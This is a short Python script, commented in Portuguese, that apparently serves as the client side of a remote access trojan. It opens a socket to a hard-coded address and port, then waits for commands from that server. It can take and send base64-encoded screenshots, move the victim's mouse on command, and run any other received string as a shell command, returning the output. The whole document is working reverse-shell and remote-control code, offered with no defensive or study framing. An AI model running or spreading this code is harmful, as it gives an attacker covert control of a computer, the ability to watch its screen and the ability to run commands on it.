import socket
import subprocess
import base64
from io import BytesIO
from PIL import ImageGrab
import pyautogui as pg

def capturar_tela():
    screenshot = ImageGrab.grab()
    buffer = BytesIO()
    screenshot.save(buffer, format="PNG")  # Salva no buffer como PNG
    return base64.b64encode(buffer.getvalue()).decode()  # Converte para base64

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('10.137.73.36', 6783))  # Conectando ao servidor

while True:
    comando = client_socket.recv(1024).decode()
    
    if not comando:
        break  # Se o servidor fechar a conexão

    if comando.lower() == "screenshot":
        imagem_base64 = capturar_tela()
        client_socket.sendall(imagem_base64.encode())  # Envia a string base64 da imagem
    elif comando.lower() == "start-control mouse":
        client_socket.sendall(comando.encode())  # Envia o comando para o servidor

        while True:
        # Recebe a posição do mouse (X,Y) como string
            data = client_socket.recv(1024).decode()
            if data.lower() == "stop":
                print("❌ Controle do mouse desativado pelo servidor.")
                break  # Sai do loop de controle do mouse

        # Divide a string "X,Y" para obter os valores individuais
            mousex, mousey = map(int, data.split(','))

            print(f"📍 Posição do mouse recebida -> X: {mousex}, Y: {mousey}")
            pg.moveTo(mousex, mousey)
    elif comando.lower() == "start eval":
        print(comando)
    else:
        try:
            processo = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            saida, erro = processo.communicate()
            resposta = saida if saida else erro
            if not resposta:
                resposta = "Não há resposta"
            client_socket.sendall(resposta.encode())
        except Exception as e:
            client_socket.sendall(f"Erro ao executar comando: {str(e)}".encode())

client_socket.close()
